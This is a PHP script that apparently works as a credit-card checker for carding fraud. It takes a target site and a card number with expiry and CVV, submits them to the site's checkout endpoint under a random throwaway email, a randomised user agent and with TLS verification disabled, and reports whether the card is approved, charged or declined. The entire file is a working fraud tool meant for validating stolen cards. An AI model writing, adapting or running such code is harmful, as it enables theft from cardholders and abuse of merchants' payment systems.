<?php
error_reporting(0);
header('Content-Type: application/json');

// ===== Dependencies =====
require_once __DIR__ . '/ua.php';

// ===== Helpers =====
function randomEmail() {
    $domains = ["gmail.com","yahoo.com","outlook.com","protonmail.com"];
    $user = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, 8);
    return $user . "@" . $domains[array_rand($domains)];
}

function jsonResponse($status, $price = "0.00", $cc = null) {
    echo json_encode([
        "Response" => $status,
        "Price"    => $price,
        "CC"       => $cc
    ], JSON_PRETTY_PRINT);
    exit;
}

// ===== Input =====
$site = isset($_GET['site']) ? trim($_GET['site']) : null;
$cc   = isset($_GET['cc'])   ? trim($_GET['cc'])   : null;

if (!$site || !$cc) {
    jsonResponse("Missing site or cc");
}

$parts = preg_split("/[|:\/ ]+/", $cc);
if (count($parts) < 4) {
    jsonResponse("Invalid CC format");
}
[$ccn, $mm, $yy, $cvv] = $parts;
if (strlen($yy) === 2) { $yy = "20" . $yy; }

// ===== Setup cURL =====
$ua = new UserAgent();
$agent = $ua->generate();

$headers = [
    "User-Agent: $agent",
    "Content-Type: application/json",
    "Accept: application/json",
    "Referer: https://$site/"
];

// Start cURL session
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_COOKIEFILE, "");
curl_setopt($ch, CURLOPT_COOKIEJAR, "");

// ===== STEP 1: Initialize session =====
curl_setopt($ch, CURLOPT_URL, "https://$site/");
curl_setopt($ch, CURLOPT_HTTPGET, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_exec($ch);

// ===== STEP 2: Checkout request =====
$email = randomEmail();
$postData = [
    "credit_card" => [
        "number" => $ccn,
        "month"  => $mm,
        "year"   => $yy,
        "verification_value" => $cvv,
        "name" => "Test User"
    ],
    "email" => $email
];

curl_setopt($ch, CURLOPT_URL, "https://$site/checkouts.json");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);

if (curl_errno($ch)) {
    jsonResponse("Curl Error: " . curl_error($ch), "0.00", $cc);
}
curl_close($ch);

// ===== STEP 3: Response Classification =====
if (!$result) {
    jsonResponse("Empty Response", "0.00", $cc);
}

$result = strtolower($result);

if (strpos($result, "approved") !== false) {
    jsonResponse("Approved", "1.00", $cc);
} elseif (strpos($result, "charged") !== false) {
    jsonResponse("Charged", "1.00", $cc);
} elseif (strpos($result, "declined") !== false) {
    jsonResponse("Declined", "0.00", $cc);
} elseif (strpos($result, "clinte token") !== false) {
    jsonResponse("Clinte Token", "0.98", $cc);
} elseif (strpos($result, "del ammount empty") !== false) {
    jsonResponse("DEL AMMOUNT EMPTY", "0.00", $cc);
} elseif (strpos($result, "product id is empty") !== false) {
    jsonResponse("PRODUCT ID IS EMPTY", "0.00", $cc);
} else {
    jsonResponse("Error", "0.00", $cc);
}
